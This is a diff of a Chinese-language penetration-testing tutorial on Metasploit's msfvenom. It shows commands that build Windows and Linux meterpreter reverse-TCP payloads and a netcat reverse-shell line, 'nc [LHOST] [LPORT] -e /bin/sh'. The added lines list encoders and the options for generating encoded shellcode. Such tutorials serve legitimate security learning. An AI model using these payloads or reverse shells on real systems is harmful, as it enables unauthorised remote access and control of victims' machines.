@@ -87,8 +87,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=[LHOST] LPORT=[LPORT] 
 msfvenom -p windows/x64/meterpreter/reverse_tcp     LHOST=[LHOST] LPORT=[LPORT]                        -f exe -o ~/payload.exe
 msfvenom -p linux/x64/meterpreter/reverse_tcp       LHOST=[LHOST] LPORT=[LPORT]                        -f elf -o ~/payload
 
-msfvenom -l payload # 查看载荷, 根据目标进行选择
-msfvenom -l format  # 查看格式, 可以是可执行文件/脚本, 也可以只是用于源代码的 shellcode 代码片段
+msfvenom -l payload  # 查看载荷, 根据目标进行选择
+msfvenom -l format   # 查看格式, 可以是可执行文件/脚本, 也可以只是用于源代码的 shellcode 代码片段
+msfvenom -l encoders # 查看编码器
 ```
 
 除了上传可执行文件到目标并执行, 也可以直接利用目标上的命令来获取 shell, 然后再将 shell 升级为 meterpreter.  
@@ -99,6 +100,16 @@ nc [LHOST] [LPORT] -e /bin/sh
 ```
 
 选择 shell_reverse_tcp 作为载荷并建立连接.  
+
+除了直接生成可执行文件/脚本, msfvenom 也可以直接生成 shellcode. 常用选项:  
+
+- -a 指定架构.
+- --platform 指定操作系统.
+- -e 指定编码器.
+- -i 指定编码次数.
+- -b 指定 bad chars.
+- -s 指定最大大小.
+- --smallest 生成最小的.
 
 ### 建立连接
 
